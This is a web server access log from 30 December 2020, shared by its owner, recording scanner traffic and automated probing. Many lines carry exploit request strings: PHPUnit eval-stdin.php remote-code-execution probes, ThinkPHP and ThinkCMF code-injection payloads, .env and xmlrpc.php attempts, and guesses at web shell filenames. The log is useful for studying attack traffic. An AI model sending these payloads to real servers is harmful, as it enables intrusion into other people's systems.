#TO PROTECT MY PROJECT I HAVE HAD TO REMOVE SOME DETAILS FROM THIS LOG FILE SUCH AS MY SERVER IP, I HAVE REPLACED IT WITH SERVER_ADDR
91.199.118.137 - - [30/Dec/2020:00:18:34 +0000] "CONNECT cdn.jsdelivr.net:443 HTTP/1.1" 405 507 "-" "Go-http-client/1.1"
91.199.118.137 - - [30/Dec/2020:00:18:34 +0000] "CONNECT cdn.jsdelivr.net:443 HTTP/1.1" 405 507 "-" "Go-http-client/1.1"
109.121.161.192 - - [30/Dec/2020:00:27:24 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.241.224.181 - - [30/Dec/2020:02:34:56 +0000] "GET /actuator/health HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
149.255.0.139 - - [30/Dec/2020:02:46:34 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
13.66.139.102 - - [30/Dec/2020:03:02:30 +0000] "GET / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
138.197.145.101 - - [30/Dec/2020:03:34:39 +0000] "\x16\x03\x01\x01\xfb\x01" 400 0 "-" "-"
139.162.145.250 - - [30/Dec/2020:04:46:24 +0000] "\x16\x03\x01" 400 0 "-" "-"
170.83.214.36 - - [30/Dec/2020:05:34:33 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
83.97.20.21 - - [30/Dec/2020:05:35:57 +0000] "GET / HTTP/1.0" 200 11192 "-" "-"
89.248.167.151 - - [30/Dec/2020:05:42:33 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
185.239.242.162 - - [30/Dec/2020:06:30:10 +0000] "GET / HTTP/1.1" 200 3440 "-" "Linux Gnu (cow)"
172.105.89.161 - - [30/Dec/2020:06:51:12 +0000] "GET /0bef HTTP/1.0" 404 466 "-" "-"
135.181.107.81 - - [30/Dec/2020:06:59:30 +0000] "GET / HTTP/1.1" 200 11229 "-" "Archive Team"
135.181.107.81 - - [30/Dec/2020:06:59:30 +0000] "GET /icons/ubuntu-logo.png HTTP/1.1" 200 3623 "http://151.ip-51-75-64.eu/" "Archive Team"
135.181.107.81 - - [30/Dec/2020:06:59:30 +0000] "GET /manual HTTP/1.1" 404 496 "http://151.ip-51-75-64.eu/" "Archive Team"
188.165.211.206 - - [30/Dec/2020:07:05:35 +0000] "POST /xmlrpc.php HTTP/1.1" 404 492 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
188.165.211.206 - - [30/Dec/2020:07:12:24 +0000] "POST /xmlrpc.php HTTP/1.1" 404 492 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
192.99.14.189 - - [30/Dec/2020:07:17:52 +0000] "POST /xmlrpc.php HTTP/1.1" 404 492 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
192.99.14.189 - - [30/Dec/2020:07:18:30 +0000] "POST /xmlrpc.php HTTP/1.1" 404 492 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
82.165.56.244 - - [30/Dec/2020:07:36:44 +0000] "GET /.env HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
82.165.56.244 - - [30/Dec/2020:07:36:44 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
188.165.194.99 - - [30/Dec/2020:07:41:31 +0000] "POST /xmlrpc.php HTTP/1.1" 404 488 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 3440 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3440 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:45 +0000] "GET /console/ HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.108 - - [30/Dec/2020:07:42:46 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
188.165.194.99 - - [30/Dec/2020:07:49:01 +0000] "POST /xmlrpc.php HTTP/1.1" 404 488 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
158.69.250.210 - - [30/Dec/2020:08:38:52 +0000] "POST /xmlrpc.php HTTP/1.1" 404 488 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
158.69.250.210 - - [30/Dec/2020:08:42:51 +0000] "POST /xmlrpc.php HTTP/1.1" 404 488 "http://www.google.com.hk" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"
174.138.30.94 - - [30/Dec/2020:09:10:30 +0000] "GET /manager/html/ HTTP/1.0" 404 466 "-" "-"
185.132.249.210 - - [30/Dec/2020:09:30:38 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
185.132.249.210 - - [30/Dec/2020:09:30:39 +0000] "GET /HNAP1/ HTTP/1.1" 404 435 "http://SERVER_ADDR/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
150.107.118.172 - - [30/Dec/2020:09:32:50 +0000] "GET /manager/html/ HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:83.0) Gecko/20100101 Firefox/83.0"
192.241.221.77 - - [30/Dec/2020:10:35:36 +0000] "GET /hudson HTTP/1.1" 404 435 "-" "Mozilla/5.0 zgrab/0.x"
5.234.249.138 - - [30/Dec/2020:10:38:53 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
71.6.232.4 - - [30/Dec/2020:11:08:56 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
64.227.97.156 - - [30/Dec/2020:11:42:46 +0000] "\x16\x03\x01\x01\xfb\x01" 400 0 "-" "-"
174.140.109.242 - - [30/Dec/2020:11:44:53 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
36.133.37.6 - - [30/Dec/2020:12:06:51 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)"
36.133.37.6 - - [30/Dec/2020:12:06:59 +0000] "GET /159.php HTTP/1.1" 404 435 "http://SERVER_ADDR/159.php" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5"
36.133.37.5 - - [30/Dec/2020:12:07:22 +0000] "GET /spre.php HTTP/1.1" 404 435 "http://SERVER_ADDR/spre.php" "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
36.133.37.3 - - [30/Dec/2020:12:07:39 +0000] "GET /spread.php HTTP/1.1" 404 435 "http://SERVER_ADDR/spread.php" "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)"
36.133.37.3 - - [30/Dec/2020:12:07:52 +0000] "GET /qqq.php HTTP/1.1" 404 435 "http://SERVER_ADDR/qqq.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8"
36.133.37.5 - - [30/Dec/2020:12:08:04 +0000] "GET /infosys.php HTTP/1.1" 404 435 "http://SERVER_ADDR/infosys.php" "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1"
36.133.37.6 - - [30/Dec/2020:12:08:12 +0000] "GET /protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
36.133.37.6 - - [30/Dec/2020:12:08:33 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13"
36.133.37.5 - - [30/Dec/2020:12:08:53 +0000] "GET /dashu.php HTTP/1.1" 404 435 "http://SERVER_ADDR/dashu.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1"
36.133.37.3 - - [30/Dec/2020:12:09:22 +0000] "GET /cadre.php HTTP/1.1" 404 435 "http://SERVER_ADDR/cadre.php" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27"
36.133.37.3 - - [30/Dec/2020:12:09:22 +0000] "GET /new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1"
36.133.37.6 - - [30/Dec/2020:12:09:56 +0000] "GET /images/1ndex.php HTTP/1.1" 404 435 "http://SERVER_ADDR/images/1ndex.php" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8"
36.133.37.6 - - [30/Dec/2020:12:10:06 +0000] "GET /aaaaaa1.php HTTP/1.1" 404 435 "http://SERVER_ADDR/aaaaaa1.php" "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0"
36.133.37.5 - - [30/Dec/2020:12:10:11 +0000] "GET /errors.php HTTP/1.1" 404 435 "http://SERVER_ADDR/errors.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
36.133.37.6 - - [30/Dec/2020:12:10:14 +0000] "GET /shi.php HTTP/1.1" 404 435 "http://SERVER_ADDR/shi.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7"
36.133.37.5 - - [30/Dec/2020:12:10:19 +0000] "GET /plus/bakup.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/bakup.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10"
36.133.37.5 - - [30/Dec/2020:12:10:41 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.3 - - [30/Dec/2020:12:10:52 +0000] "GET /DJ.php HTTP/1.1" 404 435 "http://SERVER_ADDR/DJ.php" "Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)"
36.133.37.6 - - [30/Dec/2020:12:11:01 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/phpunit/phpunit/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.800) AppleWebKit/534.6 (KHTML, like Gecko) Version/5.0 Safari/534.6.3"
36.133.37.5 - - [30/Dec/2020:12:11:10 +0000] "GET /igo.php HTTP/1.1" 404 435 "http://SERVER_ADDR/igo.php" "Opera/9.64 (Macintosh; PPC Mac OS X; U; en) Presto/2.1.1"
36.133.37.3 - - [30/Dec/2020:12:11:17 +0000] "GET /wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61"
36.133.37.5 - - [30/Dec/2020:12:11:45 +0000] "GET /wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5"
36.133.37.3 - - [30/Dec/2020:12:12:09 +0000] "GET /errors/processor.php HTTP/1.1" 404 435 "http://SERVER_ADDR/errors/processor.php" "Opera/9.80 (Windows NT 5.1; U; zh-tw) Presto/2.8.131 Version/11.10"
36.133.37.5 - - [30/Dec/2020:12:12:09 +0000] "GET /shipu.php HTTP/1.1" 404 435 "http://SERVER_ADDR/shipu.php" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2"
36.133.37.5 - - [30/Dec/2020:12:12:13 +0000] "GET /cnm.php HTTP/1.1" 404 435 "http://SERVER_ADDR/cnm.php" "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1"
36.133.37.3 - - [30/Dec/2020:12:12:21 +0000] "GET /shell.php HTTP/1.1" 404 435 "http://SERVER_ADDR/shell.php" "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.6 - - [30/Dec/2020:12:12:46 +0000] "GET /webconfig.txt.php HTTP/1.1" 404 435 "http://SERVER_ADDR/webconfig.txt.php" "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.3 - - [30/Dec/2020:12:12:50 +0000] "GET /pop.php HTTP/1.1" 404 435 "http://SERVER_ADDR/pop.php" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3"
36.133.37.5 - - [30/Dec/2020:12:13:55 +0000] "GET /plus/service.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/service.php" "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2"
36.133.37.3 - - [30/Dec/2020:12:14:03 +0000] "GET /images/swfupload/tags.php HTTP/1.1" 404 435 "http://SERVER_ADDR/images/swfupload/tags.php" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8"
36.133.37.5 - - [30/Dec/2020:12:14:12 +0000] "GET /qunhuang.php HTTP/1.1" 404 435 "http://SERVER_ADDR/qunhuang.php" "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)"
36.133.37.6 - - [30/Dec/2020:12:14:26 +0000] "GET /15.php HTTP/1.1" 404 435 "http://SERVER_ADDR/15.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18"
36.133.37.5 - - [30/Dec/2020:12:14:27 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8"
36.133.37.6 - - [30/Dec/2020:12:14:30 +0000] "GET /luso.php HTTP/1.1" 404 435 "http://SERVER_ADDR/luso.php" "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
36.133.37.5 - - [30/Dec/2020:12:14:41 +0000] "GET /51.php HTTP/1.1" 404 435 "http://SERVER_ADDR/51.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre"
36.133.37.5 - - [30/Dec/2020:12:14:54 +0000] "GET /paylog.php HTTP/1.1" 404 435 "http://SERVER_ADDR/paylog.php" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15"
36.133.37.3 - - [30/Dec/2020:12:15:02 +0000] "GET /lanyecn.php HTTP/1.1" 404 435 "http://SERVER_ADDR/lanyecn.php" "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.6 - - [30/Dec/2020:12:15:14 +0000] "GET /wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13"
36.133.37.5 - - [30/Dec/2020:12:15:43 +0000] "GET /xmlrpc.php HTTP/1.1" 404 435 "http://SERVER_ADDR/xmlrpc.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)"
36.133.37.6 - - [30/Dec/2020:12:15:44 +0000] "GET /plus/moon.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)"
36.133.37.3 - - [30/Dec/2020:12:15:51 +0000] "GET /images/1.php HTTP/1.1" 404 435 "http://SERVER_ADDR/images/1.php" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )"
36.133.37.6 - - [30/Dec/2020:12:15:53 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/vendor/phpunit/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"
36.133.37.3 - - [30/Dec/2020:12:15:57 +0000] "GET /hannan.php HTTP/1.1" 404 435 "http://SERVER_ADDR/hannan.php" "Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a"
36.133.37.5 - - [30/Dec/2020:12:16:01 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5"
36.133.37.5 - - [30/Dec/2020:12:16:37 +0000] "GET /include/data/tags.php HTTP/1.1" 404 435 "http://SERVER_ADDR/include/data/tags.php" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0) Gecko/16.0 Firefox/16.0"
36.133.37.5 - - [30/Dec/2020:12:16:41 +0000] "GET /12345.php HTTP/1.1" 404 435 "http://SERVER_ADDR/12345.php" "Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a"
36.133.37.3 - - [30/Dec/2020:12:16:46 +0000] "GET /plus/mybak.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/mybak.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0"
36.133.37.6 - - [30/Dec/2020:12:16:47 +0000] "GET /info.php HTTP/1.1" 404 435 "http://SERVER_ADDR/info.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10"
36.133.37.3 - - [30/Dec/2020:12:16:49 +0000] "GET /back.php HTTP/1.1" 404 435 "http://SERVER_ADDR/back.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941"
36.133.37.3 - - [30/Dec/2020:12:17:05 +0000] "GET /blog/xmlrpc.php HTTP/1.1" 404 435 "http://SERVER_ADDR/blog/xmlrpc.php" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20"
36.133.37.3 - - [30/Dec/2020:12:17:08 +0000] "GET /administrator/webconfig.txt.php HTTP/1.1" 404 435 "http://SERVER_ADDR/administrator/webconfig.txt.php" "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
36.133.37.3 - - [30/Dec/2020:12:17:08 +0000] "GET /xiaoxi.php HTTP/1.1" 404 435 "http://SERVER_ADDR/xiaoxi.php" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)"
36.133.37.3 - - [30/Dec/2020:12:17:08 +0000] "GET /confie.php HTTP/1.1" 404 435 "http://SERVER_ADDR/confie.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13"
36.133.37.5 - - [30/Dec/2020:12:17:14 +0000] "GET /plus/laobiaoaien.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/laobiaoaien.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14"
36.133.37.3 - - [30/Dec/2020:12:17:15 +0000] "GET /old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.800) AppleWebKit/534.6 (KHTML, like Gecko) Version/5.0 Safari/534.6.3"
36.133.37.5 - - [30/Dec/2020:12:17:22 +0000] "GET /plus/90sec.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/90sec.php" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0)"
36.133.37.3 - - [30/Dec/2020:12:17:33 +0000] "GET /code.php HTTP/1.1" 404 435 "http://SERVER_ADDR/code.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1"
36.133.37.5 - - [30/Dec/2020:12:17:36 +0000] "GET /mybestloves.php HTTP/1.1" 404 435 "http://SERVER_ADDR/mybestloves.php" "Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1"
36.133.37.5 - - [30/Dec/2020:12:17:45 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 435 "http://SERVER_ADDR/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0"
36.133.37.5 - - [30/Dec/2020:12:17:52 +0000] "GET /plus/xsvip.php HTTP/1.1" 404 435 "http://SERVER_ADDR/plus/xsvip.php" "Opera/9.5 (Microsoft Windows; PPC; Opera Mobi; U) SonyEricssonX1i/R2AA Profile/MIDP-2.0 Configuration/CLDC-1.1"
36.133.37.5 - - [30/Dec/2020:12:17:53 +0000] "GET /images/entyy.php HTTP/1.1" 404 435 "http://SERVER_ADDR/images/entyy.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13"
36.133.37.5 - - [30/Dec/2020:12:17:56 +0000] "GET /about.php HTTP/1.1" 404 435 "http://SERVER_ADDR/about.php" "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10"
36.133.37.6 - - [30/Dec/2020:12:17:57 +0000] "GET /images/asp.php HTTP/1.1" 404 435 "http://SERVER_ADDR/images/asp.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
